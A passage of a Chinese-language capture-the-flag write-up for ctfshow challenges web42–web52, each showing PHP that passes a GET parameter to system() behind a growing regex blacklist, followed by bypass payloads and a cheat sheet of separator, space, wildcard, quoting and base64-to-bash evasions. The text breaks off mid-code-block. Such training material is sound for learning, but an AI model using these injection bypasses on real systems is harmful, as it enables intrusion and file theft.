time: 2020-09-05 20:51:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>get方法获取参数，system执行命令，主要语句是<code>&gt;/dev/null 2&gt;&amp;1</code>，该语句在shell脚本中经常可以看到，可以参考下面这篇文章<a href="https://www.cnblogs.com/ultranms/p/9353157.html">&gt;/dev/null 2&gt;&amp;1</a>对该语句有详细讲解，</p><p>其中/dev/null可以看做一个只写的文件，但所有写入的东西都会丢失，尝试从中读取是读取不到任何内容的，</p><p><code>&gt;</code>代表重定向，echo “123” &gt; /home/123.txt     意思是echo 123 到/home/123.txt中</p><table><thead><tr><th>类型</th><th>文件描述符</th><th>默认情况</th><th>对应文件句柄位置</th></tr></thead><tbody><tr><td>标准输入（standard input）</td><td>0</td><td>从键盘获得输入</td><td>/proc/self/fd/0</td></tr><tr><td>标准输出（standard output）</td><td>1</td><td>输出到屏幕（即控制台）</td><td>/proc/self/fd/1</td></tr><tr><td>错误输出（error output）</td><td>2</td><td>输出到屏幕（即控制台）</td><td>/proc/self/fd/2</td></tr></tbody></table><p>2代表错误输出</p><p>1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null</p><p>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p><p><strong>这条命令的意思是将标准输出和错误输出全部重定向到/dev/null中,也就是将产生的所有信息丢弃</strong></p><p>  省略了标准输出1，等价于为 1&gt;/dev/null 2&gt;&amp;1</p><p>  标准输出重定向到/dev/null，错误输出重定向到标准输出，前面标准输出已重定向到/dev/null，所以标准输出/错误输出都重定向到/dev/null，及全部丢弃，</p><p>回到题目中，我们想要执行命令，比如<code>ls</code>,?c=ls，但这样会被重定向到/dev/null中，我们无法看到回显，所以要进行截断，使用分号<code>;</code>就可以截断或者使用%20（空格）%0a（换行）进行截断，</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;ls; url&#x2F;?c&#x3D;cat flag.php;url&#x2F;?c&#x3D;ls%a0 url&#x2F;?c&#x3D;cat flag.php%0a截断后既可以不被后面的重定向干扰，实现输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 21:32:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一道题的基础上过滤了分号和cat，使用%0a进行截断（或者使用||进行截断）并将cat用nl进行替换</p><p>nl命令在linux系统中用来计算文件中行号，nl 可以将输出的文件内容自动的加上行号，及输出文件内容的时候在前面加上行号，</p><p>或者使用tac命令，tac命令用于将文件已行为单位的反序输出，即第一行最后显示，最后一行先显示。</p><p>所以在本题中可以看到执行了命令后会有一个行号1</p><p><img src="/images/image-20210125095059817.png"></p><p>本题payload：</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;ls%0a url&#x2F;?c&#x3D;nl flag.php%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 21:32:01# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/;|cat|flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一道题的基础上过滤了flag，使用*即可，payload：</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;nl fla*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 21:35:34# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| /i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一道题的基础上过滤了空格，绕过空格就好了</p><p>使用%09绕过空格即可，payload：</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;nl%09fla*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>各种绕过的方法其实很多，在这里进行一个记录</p><h3 id="各种绕过姿势简要记录"><a href="#各种绕过姿势简要记录" class="headerlink" title="各种绕过姿势简要记录"></a>各种绕过姿势简要记录</h3><p>这里是师傅<a href="https://www.cnblogs.com/erR0Ratao/p/13640600.html">erR0Ratado</a>的博客中的关于这几道题42-54的wp中记录的，进行一个摘抄</p><p><strong>分隔命令</strong></p><pre class="line-numbers language-none"><code class="language-none">;&#x2F;&#x2F;分号，截断|&#x2F;&#x2F;只执行后面那条命令||&#x2F;&#x2F;只执行前面那条命令&amp;&#x2F;&#x2F;两条命令都会执行&amp;&amp;&#x2F;&#x2F;两条命令都会执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过分隔命令来实现执行的命令的控制，比如分号和||可以用于这几道题的截断，</p><p><strong>空格绕过</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;&lt;&gt;&#x2F;&#x2F;需要写的权限$&#123;IFS&#125;$IFS$9%20%09%3cA&#x3D;$&#39;cat\x20flag&#39;&amp;&amp;$AA&#x3D;$&#39;cat\x09flag&#39;&amp;&amp;$A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过这些可以对空格进行绕过</p><p><strong>黑名单绕过</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;一般情况像flag、php这种字符会被ban掉，这时候就需要进行绕过了通配符*&#x2F;&#x2F;匹配任何文本或字符串，这个通过测试发现并不能与IFS或&lt;这两个字符一起使用?&#x2F;&#x2F;匹配单个任意字符 空字符$@&#x2F;&#x2F;ca$@t flag$1-$9&#x2F;&#x2F;ca$1t flag$&#123;数字&#125;  &#x2F;&#x2F;ca$&#123;1&#125;t flag 编码绕过echo &quot;Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;&quot;|base64 -d|bash&#x2F;&#x2F;解码为cat flag.php并执行echo &quot;cat flag.php&quot;|base64&#x2F;&#x2F;最好别在在线网站编码，不然可能会将空格转成url编码，从而无法执行命令 变量替换a&#x3D;t;b&#x3D;g;ca$a fla$b.php 引号ca&#39;&#39;t fl&#39;&#39;ag.php 反斜杆ca\t f\la\g.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过这些可以绕过部分过滤</p><p><strong>linux查看命令</strong></p><p>有的时候cat会被过滤掉，这样就可以使用其他的命令来进行代替，</p><pre class="line-numbers language-none"><code class="language-none">cat&#x2F;&#x2F;cat flag.phptac&#x2F;&#x2F;tac flag.phphead&#x2F;&#x2F;head flag.phptail&#x2F;&#x2F;tail flag.phpnl&#x2F;&#x2F;nl flag.phpmore&#x2F;&#x2F;more flag.phpless&#x2F;&#x2F;less flag.phpod&#x2F;&#x2F;od flag.phpgrep&#x2F;&#x2F;grep &#39;fla&#39; flag.phpstrings&#x2F;&#x2F;strings flag.phpsort&#x2F;&#x2F;sort flag.phppaste&#x2F;&#x2F;paste flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 21:50:19# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在之前的基础上过滤了数字，通配符*，$符，</p><p>因为过滤了数字和$，所以绕过空格的方法只有使用尖括号了，过滤了*可以使用?或者使用单引号进行绕过，payload：</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;nl&lt;&gt;fl&#39;&#39;ag.php||url&#x2F;?c&#x3D;c&#39;&#39;at&lt;fla?????||#这一个不能用，但应该是可以的啊<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 21:59:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一道题的基础上过滤了几个命令，more，less等，直接用nl或者别的，或者直接ca’’t即可绕过，和上一道的payload相同。</p><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:06:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又多过滤了几个命令，但依然用的上一道的payload即可，这几个命令是什么意思呢，简要记录一下</p><p>sed：Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p><p>cut：cut命令用于显示每行从开头算起 num1 到 num2 的文字。</p><p>awk：AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。</p><p>strings：打印文件中可打印的字符</p><p>od：od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。</p><p>curl：在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具</p><p>具体用法遇见了再说</p><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:22:43# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多过滤了百分号%，继续用上一个payload</p><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:32:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多过滤了\x09,\x26,ascii编码中的Tab和&amp;被过滤了，但并没有影响，所以还是同样的payload</p><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:42:52# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多过滤了tac，但依然没有影响，依然是上一道的payload</p><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-05 22:50:30# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了尖括号&lt;&gt;,但去掉了对$的过滤，用${IFS}进行空格的绕过</p><p>payload</p><pre class="line-numbers language-none"><code 